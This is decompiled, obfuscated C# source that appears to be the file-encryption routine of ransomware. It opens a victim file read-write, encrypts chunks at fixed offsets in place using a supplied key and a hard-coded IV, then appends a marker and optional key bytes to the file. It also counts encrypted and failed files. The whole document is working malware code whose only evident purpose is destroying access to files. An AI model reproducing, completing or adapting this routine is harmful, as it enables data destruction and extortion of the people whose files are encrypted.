using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using qKKKydaPmBIOW;

namespace qYAjLWajCJpnf;

internal sealed class moeoEUcfSQywx
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int pDSQmvdZbEUD(long long_0)
	{
		return (int)long_0;
	}

	public static bool MtYwfepEBjPifI(string WdtqmErgZJDNR, string LHrGpnQKzTdZOx, string eJSkrcdqHzLHAMc, byte[] kQikxFjlGMQ = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(WdtqmErgZJDNR, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = pDSQmvdZbEUD(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(LHrGpnQKzTdZOx) * Convert.ToInt32(fileStream.Length) / 100;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = int.MaxValue;
				}
				if (num < num2)
				{
					num2 = num - Convert.ToInt32(LHrGpnQKzTdZOx) * 1000 * 1000;
				}
				int xxEvOvSPzlp = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 2; i++)
				{
					byte[] byte_ = NnIWmCPpEMc(WdtqmErgZJDNR, fileStream, xxEvOvSPzlp, num * i);
					array = (bTJSgdVkQM.iRryUAENoXyxNt ? ivMVFneIiiSs.QBYVYTkGHVQKD(byte_, Encoding.ASCII.GetBytes(eJSkrcdqHzLHAMc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YyTkJTBkSaQ.grhgCFxqniVe(byte_, Encoding.ASCII.GetBytes(eJSkrcdqHzLHAMc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					sVJcXNjsdvOrotQ(WdtqmErgZJDNR, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (bTJSgdVkQM.CVCyEBDPJVibYms ? Encoding.ASCII.GetBytes(bTJSgdVkQM.gvCYkntYkqMW(getString_0(107456102)) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457086)) + Convert.ToString(LHrGpnQKzTdZOx) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457086))) : Encoding.ASCII.GetBytes(bTJSgdVkQM.gvCYkntYkqMW(getString_0(107456102)) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457095)) + Convert.ToString(LHrGpnQKzTdZOx) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457095))));
			if (!bTJSgdVkQM.CVCyEBDPJVibYms)
			{
				using FileStream fileStream2 = new FileStream(WdtqmErgZJDNR, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(WdtqmErgZJDNR, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(kQikxFjlGMQ, 0, kQikxFjlGMQ.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (bTJSgdVkQM.JJYUPCZGaGN)
			{
				try
				{
					File.AppendAllText(bTJSgdVkQM.vzSBJQFXpb, getString_0(107378861) + WdtqmErgZJDNR + getString_0(107456121) + ex.Message + getString_0(107397229));
				}
				catch (Exception)
				{
				}
			}
			bTJSgdVkQM.AmOSyvkYqZhk++;
			return false;
		}
		bTJSgdVkQM.ytQePvltMhp++;
		return true;
	}

	public static byte[] NnIWmCPpEMc(string ploQMsEGpQb, FileStream VdwGloEaMaQmVYpG, int xxEvOvSPzlp, int mtkauaLbnAY = 0)
	{
		byte[] array = new byte[xxEvOvSPzlp];
		VdwGloEaMaQmVYpG.Position = mtkauaLbnAY;
		VdwGloEaMaQmVYpG.Read(array, 0, xxEvOvSPzlp);
		return array;
	}

	public static void sVJcXNjsdvOrotQ(string LkSiemHCNOz, FileStream YmOjAanYAtY, byte[] ffyLHPohnoXGo, int BhimouCxbdgTIz = 0)
	{
		YmOjAanYAtY.Position = BhimouCxbdgTIz;
		YmOjAanYAtY.Write(ffyLHPohnoXGo, 0, ffyLHPohnoXGo.Length);
	}

	static moeoEUcfSQywx()
	{
		Strings.CreateGetStringDelegate(typeof(moeoEUcfSQywx));
	}
}
